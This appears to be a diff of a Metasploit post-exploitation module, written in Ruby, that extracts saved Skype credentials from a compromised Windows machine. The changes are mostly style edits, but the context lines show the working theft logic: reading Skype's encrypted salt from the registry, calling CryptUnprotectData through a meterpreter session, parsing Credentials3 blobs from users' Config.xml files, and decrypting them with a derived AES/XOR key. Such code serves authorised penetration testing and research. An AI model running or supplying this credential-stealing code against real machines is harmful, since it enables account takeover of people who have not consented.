@@ -30,7 +30,7 @@ class MetasploitModule < Msf::Post
         'SessionTypes' => [ 'meterpreter' ],
         'References' => [
           ['URL', 'http://www.recon.cx/en/f/vskype-part2.pdf'],
-          ['URL', 'http://insecurety.net/?p=427'],
+          ['URL', 'https://web.archive.org/web/20140207115406/http://insecurety.net/?p=427'],
           ['URL', 'https://github.com/skypeopensource/tools']
         ],
         'Compat' => {
@@ -74,32 +74,32 @@ puts hash.hexdigest
     mem = process.memory.allocate(512)
     process.memory.write(mem, data)
 
-    if session.sys.process.each_process.find { |i| i["pid"] == pid } ["arch"] == "x86"
-      addr = [mem].pack("V")
-      len = [data.length].pack("V")
+    if session.sys.process.each_process.find { |i| i['pid'] == pid } ['arch'] == 'x86'
+      addr = [mem].pack('V')
+      len = [data.length].pack('V')
       ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
-      len, addr = ret["pDataOut"].unpack("V2")
+      len, addr = ret['pDataOut'].unpack('V2')
     else
       # Convert using rex, basically doing: [mem & 0xffffffff, mem >> 32].pack("VV")
       addr = Rex::Text.pack_int64le(mem)
       len = Rex::Text.pack_int64le(data.length)
       ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
-      pData = ret["pDataOut"].unpack("VVVV")
+      pData = ret['pDataOut'].unpack('VVVV')
       len = pData[0] + (pData[1] << 32)
       addr = pData[2] + (pData[3] << 32)
     end
 
-    return "" if len == 0
+    return '' if len == 0
 
     return process.memory.read(addr, len)
   end
 
   # Get the "Salt" unencrypted from the registry
   def get_salt
-    print_status "Checking for encrypted salt in the registry"
-    vprint_status "Checking: HKCU\\Software\\Skype\\ProtectedStorage - 0"
+    print_status 'Checking for encrypted salt in the registry'
+    vprint_status 'Checking: HKCU\\Software\\Skype\\ProtectedStorage - 0'
     rdata = registry_getvaldata('HKCU\\Software\\Skype\\ProtectedStorage', '0')
-    print_good("Salt found and decrypted")
+    print_good('Salt found and decrypted')
     return decrypt_reg(rdata)
   end
 
@@ -120,7 +120,7 @@ puts hash.hexdigest
   end
 
   def parse_config_file(config_path)
-    hex = ""
+    hex = ''
     configfile = read_file(config_path)
     configfile.each_line do |line|
       if line =~ /Credentials/i
@@ -132,40 +132,40 @@ puts hash.hexdigest
 
   def decrypt_blob(credhex, salt)
     # Convert Config.xml hex to binary format
-    blob = [credhex].pack("H*")
+    blob = [credhex].pack('H*')
 
     # Concatinate SHA digests for AES key
     sha = Digest::SHA1.digest("\x00\x00\x00\x00" + salt) + Digest::SHA1.digest("\x00\x00\x00\x01" + salt)
 
-    aes = OpenSSL::Cipher.new("AES-256-CBC")
+    aes = OpenSSL::Cipher.new('AES-256-CBC')
     aes.encrypt
     aes.key = sha[0, 32] # Use only 32 bytes of key
-    final = aes.update([0].pack("N*") * 4) # Encrypt 16 \x00 bytes
+    final = aes.update([0].pack('N*') * 4) # Encrypt 16 \x00 bytes
     final << aes.final
     xor_key = final[0, 16] # Get only the first 16 bytes of result
 
-    vprint_status("XOR Key: #{xor_key.unpack("H*")[0]}")
+    vprint_status("XOR Key: #{xor_key.unpack('H*')[0]}")
 
     decrypted = []
 
     # Use AES/SHA crypto for XOR decoding
-    (0...16).each do |i|
-      decrypted << (blob[i].unpack("C*")[0] ^ xor_key[i].unpack("C*")[0])
+    16.times do |i|
+      decrypted << (blob[i].unpack('C*')[0] ^ xor_key[i].unpack('C*')[0])
     end
 
-    return decrypted.pack("C*").unpack("H*")[0]
+    return decrypted.pack('C*').unpack('H*')[0]
   end
 
   def get_config_creds(salt)
     users = []
-    appdatapath = expand_path("%AppData%") + "\\Skype"
-    print_status("Checking for config files in %APPDATA%")
+    appdatapath = expand_path('%AppData%') + '\\Skype'
+    print_status('Checking for config files in %APPDATA%')
     users = get_config_users(appdatapath)
     if users.any?
       users.each do |user|
         print_status("Parsing #{appdatapath}\\#{user}\\Config.xml")
         credhex = parse_config_file("#{appdatapath}\\#{user}\\config.xml")
-        if credhex == ""
+        if credhex == ''
           print_error("No Credentials3 blob found for #{user} in Config.xml skipping")
           next
         else
@@ -174,16 +174,16 @@ puts hash.hexdigest
         end
       end
     else
-      print_error "No users with configs found. Exiting"
+      print_error 'No users with configs found. Exiting'
     end
   end
 
   def run
     salt = get_salt
-    if salt != nil
+    if !salt.nil?
       creds = get_config_creds(salt)
     else
-      print_error "No salt found. Cannot continue without salt, exiting"
+      print_error 'No salt found. Cannot continue without salt, exiting'
     end
   end
 end
